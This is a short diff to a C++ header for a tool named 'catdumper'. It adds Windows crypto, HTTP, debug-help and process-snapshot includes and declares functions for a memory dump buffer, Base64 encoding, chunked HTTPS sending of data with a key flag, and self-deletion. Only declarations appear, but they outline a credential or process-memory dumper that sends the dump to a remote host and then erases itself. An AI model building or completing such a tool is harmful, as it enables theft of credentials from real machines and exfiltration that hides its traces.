@@ -2,16 +2,16 @@
 #define catdumper
 
 #include <windows.h>
-#include <DbgHelp.h>
+#include <wincrypt.h>
+#include <winhttp.h>
+#include <dbghelp.h>
 #include <iostream>
 #include <string>
 #include <random>
 #include <vector>
-#include <cctype>
-#include <limits>
-#include <ctime>
-#include <cstdlib>
-#include <TlHelp32.h>
+#include <chrono>
+#include <thread>
+#include <tlhelp32.h>
 #include <processsnapshot.h>
 
 extern LPVOID dumpBuffer;
@@ -34,7 +34,7 @@ std::string Base64Encode(const std::string& input);
 
 std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
 bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false);
-void SendDataInChunks(const std::vector<std::string>& chunks, const std::string& hostname, const std::string& path);
+void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path);
 
 void SelfDelete();
 
